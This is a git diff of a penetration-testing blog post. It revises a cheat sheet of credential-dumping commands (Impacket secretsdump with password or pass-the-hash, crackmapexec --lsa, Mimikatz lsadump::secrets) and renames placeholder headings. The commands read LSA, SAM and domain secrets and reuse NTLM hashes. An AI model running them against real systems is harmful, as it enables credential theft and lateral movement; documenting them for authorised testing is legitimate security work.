@@ -27,7 +27,7 @@ Most of these methods will work without any extra work, but for reference I'll a
 ## Impacket SecretsDump
 {% highlight shell %}
     python3 secretsdump.py <AD FQDN>/<USERNAME>:<PASSWORD>@<IP ADDRESS>
-    python3 secretsdump.py -hashes <NTLM FULL HASH> <AD FQDN>/<USER>@<IP ADDRESS>
+    python3 secretsdump.py -hashes <NTLM FULL HASH> <AD FQDN>/<USERNAME>@<IP ADDRESS>
     python3 secretsdump.py -sam <SAMNAME> -security <SECURITYNAME> -system <SYSTEMNAME> LOCAL
 {% endhighlight %}
 
@@ -36,18 +36,16 @@ Most of these methods will work without any extra work, but for reference I'll a
     crackmapexec smb <IP ADDRESS OR RANGE> -u <USERNAME> -p '<PASSWORD>' --lsa
 {% endhighlight %}
 
-## Mimikatz
+## Mimikatz (Windows)
 {% highlight powershell %}
     lsadump::secrets /system:<LOCATION OF SYSTEM REG FILE> /security:<LOCATION OF SECURITY FILE>
 {% endhighlight %}
 
 <br>
 # Down The Rabbit Hole
-## test
-### test2
-### test3
-##
-##
+## Attack Demonstration
+## What's Really Happening
+
 
 
 # Tool References
